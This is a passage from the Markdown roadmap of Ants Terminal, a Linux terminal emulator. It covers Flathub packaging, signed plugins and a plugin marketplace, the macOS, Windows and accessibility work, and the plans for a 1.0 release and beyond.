  x-checker-data stanza). The `flathub/shared-modules` path
  remains the cleaner long-term home if Flathub ever accepts a
  Lua 5.4 entry — migration would replace the in-manifest module
  with a shared-modules reference; `x-checker-data` would
  continue to fire. See
  [CHANGELOG.md §0.7.3](CHANGELOG.md#073--2026-04-20).
- 📋 **H6.2 — Flathub submission**. PR a new repo against
  [flathub/flathub](https://github.com/flathub/flathub) named
  `org.ants.Terminal`. In-tree prep is complete: the
  `<screenshots>` block in
  `packaging/linux/org.ants.Terminal.metainfo.xml` now points at three
  captures under `docs/screenshots/` so Flathub's store tile renders
  with real UI (main terminal + Review Changes dialog + Project Audit
  panel), and `packaging/flatpak/make-flathub-manifest.sh` + a feature
  test pin the transformation from the dev manifest
  (`type: dir / path: ../..`) to the Flathub manifest
  (`type: git / url: https://github.com/milnet01/ants-terminal /
  tag: v<version>`) so there is one source of truth for the manifest.
  Submission playbook lives at
  [packaging/flatpak/FLATHUB.md](packaging/flatpak/FLATHUB.md).
  Remaining blocker is real-user shakedown of the v0.7.3 Flatpak —
  wait for a small cohort to exercise the host-shell + plugin build
  before claiming the Flathub repo name. Once the PR merges, Flathub
  CI rebuilds on each new `v<version>` tag — no manual work per
  release, only per-bump regeneration of the tag-pinned manifest
  (one script invocation). On landing, flip the "gating item 1: no
  distro packages anywhere" entry in the
  [Distribution-adoption overview](#distribution-adoption-overview)
  from "H5 + H6 unblock this" to "unblocked".
- 📋 **H7 — project website + docs site**. Static GitHub Pages site
  at `ants-terminal.github.io` (or equivalent) with: screenshots,
  installation instructions (once H5/H6 land), plugin authoring
  guide (move `PLUGINS.md` body here, keep the file as a pointer),
  quickstart, architecture overview, video/asciicast demos.
  Content-as-code (markdown → static site generator) so the docs
  ship from the same repo.
- 📋 **H13 — distro-outreach launch**. Once H1–H7 are shipped:
  file **intent-to-package** bugs / RFPs in Debian / Fedora /
  NixOS / openSUSE / Arch (as applicable); write a
  **"Why Ants Terminal"** post for r/linux, Hacker News, Phoronix
  tip line, LWN. Focus angle: **the only Linux terminal with a
  built-in capability-audited Lua plugin system + AI triage +
  first-class shell-integration blocks**. Measure via watching
  the GitHub stars + install metrics, not vanity.

### 🔌 Plugins — marketplace

- 📋 **Signed plugin packaging**: Ed25519 sig over a tarball containing
  `init.lua`, `manifest.json`, and optional assets. Loader verifies
  against a project-maintained keyring + (optionally) user-added keys.
- 📋 **Public marketplace index**: static JSON hosted on GitHub Pages
  listing name, version, author, signature-status, permission summary.
  Settings → Plugins → Browse lists them with an install button.
- 📋 **Plugin dependency resolution**: `manifest.json` `requires: [...]`
  field; install flow resolves transitively.

### 🖥 Platform

(See the 📦 Distribution readiness section above for the Flatpak +
source-package packaging work; items that don't fit there live
here.)

---

## 0.9.0 — platform + a11y (target: 2026-10)

**Theme:** reach new users. Port, accessibility, internationalization.

### 🖥 Platform

- 📋 **H8 — macOS port**. Qt6 ports cleanly; replace `forkpty` with
  `posix_spawn` + `openpty`, swap `xcbpositiontracker` for
  `NSWindow` KVO observers, sign+notarize the `.app`. Expands the
  addressable audience — a terminal that only runs on Linux is not
  a "Linux terminal project", it's a "Linux-only terminal" —
  distinction matters for cross-platform press coverage.
- 💭 **H12 — Windows port**. ConPTY via `CreatePseudoConsole`
  replaces PTY; `xcbpositiontracker` becomes a no-op. Qt6's
  Windows platform plugin handles the rest. Sign + ship MSI /
  MSIX. Moved to Beyond 1.0 in practice — gating on macOS port
  completing first.

### 🖥 Accessibility

- 📋 **H9 — AT-SPI/ATK support**. Qt6 has AT-SPI over D-Bus natively.
  Work: implement `QAccessibleInterface` for `TerminalWidget`
  exposing role `Terminal`; fire `text-changed` / `text-inserted`
  on grid mutations (gate on OSC 133 `D` markers to batch); expose
  cursor as caret
  ([freedesktop AT-SPI2](https://www.freedesktop.org/wiki/Accessibility/AT-SPI2/)).
  Without this, Orca reads nothing in the terminal. Ubuntu /
  Fedora accessibility review gates on this.
- 💭 **Screen-magnifier-friendly rendering**: honor
  `QGuiApplication::styleHints()->mousePressAndHoldInterval()` and
  provide high-contrast theme variants.

### 🌍 Internationalization

- 📋 **H10 — i18n scaffolding**. Qt's `lupdate` / `linguist` flow;
  wrap all UI strings with `tr()`; ship `.qm` files in
  `assets/i18n/`. Today we have zero `tr()` usage. Start with
  English → Spanish, French, German as a proof of concept. Some
  distros gate review on this.
- 💭 **Right-to-left text support** — bidirectional text in the grid.
  Non-trivial; defer until demand is concrete.

### 📦 Distribution readiness (H11)

- 💭 **H11 — reproducible builds + SBOM**. Build under
  `SOURCE_DATE_EPOCH` so binary hashes are deterministic; generate
  an SPDX SBOM (`spdx-tools` or `syft`) alongside release
  artifacts. Reproducibility is a distro / supply-chain trust
  signal; the SBOM gives downstream security teams (Debian,
  NixOS) a machine-readable dep inventory without having to scrape
  our build system.

### 🧰 Dev experience

- 📋 **Plugin development SDK**: `ants-terminal --plugin-test <dir>`
  runs a plugin against a mock PTY with scripted events. Enables
  unit-testing plugins.

---

## 1.0.0 — stability milestone (target: 2026-12)

**Theme:** API freeze. No new features; quality, docs, migration guide.

- 📋 **`ants.*` API stability pledge**: the 1.0 surface won't break in
  `1.x` minor releases. Breaking changes queue for 2.0.
- 📋 **Performance regression suite**: CI benchmarks (grid throughput,
  scrollback allocation, paint-loop time) with commit-level deltas.
- 📋 **Documentation pass**: every user-facing feature has at least one
  screenshot + one animated demo. Rolls up into H7 (docs site).
- 📋 **External security audit**. `SECURITY.md` disclosure policy
  itself ships early under H1 (0.7.0); the 1.0 item is the
  **external** audit — budget a third-party review of the VT
  parser, plugin sandbox, and OSC-8/OSC-52 surfaces before
  stamping 1.0.
- 📋 **H14 — bus factor ≥ 2 + governance doc**. Second maintainer
  with commit rights; a short `GOVERNANCE.md` describing
  decision-making, release process, conflict resolution. Distros
  treat single-maintainer projects as a risk — a documented
  second maintainer clears the bar.
- 📋 **Plugin migration guide** for any manifest/API changes between
  0.9 and 1.0.

---

## Beyond 1.0 — long-horizon

These are far enough out that specifics will change. Captured here so
contributors don't duplicate research.

### 🔌 Plugins

- 💭 **WebAssembly plugins** via `wasmtime` or `wasmer`. Same `ants.*`
  API exposed as WASI imports. Lua plugins continue to work — WASM is
  additive for authors who want Rust/Go/AssemblyScript. Stronger
  sandbox than Lua's removed-globals model; language-agnostic. Ghostty
  is experimenting with a WASM-targeting VT library today.
- 💭 **Inter-plugin pub/sub**: `ants.bus.publish(topic, data)` /
  `ants.bus.subscribe(topic, handler)`. Needs careful permission
  modeling — a "read_bus: <topic>" capability.

### 🎨 Features

- 💭 **AI command composer** (Warp-style). Dialog over the prompt
  accepts natural language, returns a shell command + explanation.
  Uses the existing OpenAI-compatible config; opt-in per invocation.
- 💭 **Collaborative sessions**: real-time shared terminal with a
  second user via an end-to-end encrypted relay. The "share
  terminal with a colleague" feature tmate popularized.
- 💭 **Workspace sync**: mirror `config.json`, plugins, and SSH
  bookmarks across devices via a user-configurable git remote.

### 🔒 Security

- 💭 **Confidential computing**: run the PTY in an SGX/SEV enclave,
  with the renderer as the untrusted host. Meaningful for people who
  type secrets into the terminal — every keystroke lives only in
  enclave memory until it's shown on-screen. Heavy lift; benefit
  concentrated in a small user set.

### ⚡ Performance

- 💭 **GPU text rendering with ligatures**. Today GPU path can't
  render ligatures (HarfBuzz shaping is on the CPU path). Port the
  shaping step to a compute shader; keep the atlas path we already
  have.

### 📦 Distribution & community (H15–H16)

- 💭 **H15 — conference presence**. FOSDEM lightning talk or a
  devroom slot (the Linux desktop devroom is where distro
  maintainers converge). Other options: LinuxFest Northwest,
  Everything Open, SCaLE. One talk reaches more maintainers than
  a hundred issues. Submit in the CFP window for whatever
  conference the project is scope-ready for at the time.
- 💭 **H16 — sponsorship / funding model**. GitHub Sponsors + Open
  Collective. Even small recurring funding signals project
  longevity to distro security teams (they care about "who pays
  for the 30-day CVE response?"). Tiered: individual ($5/mo),
  plugin-author ($20/mo with logo on docs site), corporate
  ($250/mo with logo + priority issue triage).

---

## How to propose a roadmap item

Open a GitHub issue with:

1. **What**: one-sentence description of the capability or change.
2. **Why**: concrete user problem it addresses. Link to the source
   (forum post, issue, personal story) if possible.
3. **Prior art**: has another terminal solved this? Which one, how?
   Link the source.
4. **Scope hint**: is this a weekend change, a week, or a month?
5. **Category**: which theme (🎨/⚡/🔌/🖥/🔒/🧰/📦) does it belong to?

Items that fit naturally into the current release arc land in that
release. Items that don't get queued here with a 💭 marker until
the scope clarifies.

**A roadmap item is not a commitment.** It's a record that we thought
about it, found the prior art, and believe it fits the product. Scope
changes with bandwidth and real-world feedback. Check the
[CHANGELOG.md](CHANGELOG.md) for what actually shipped.
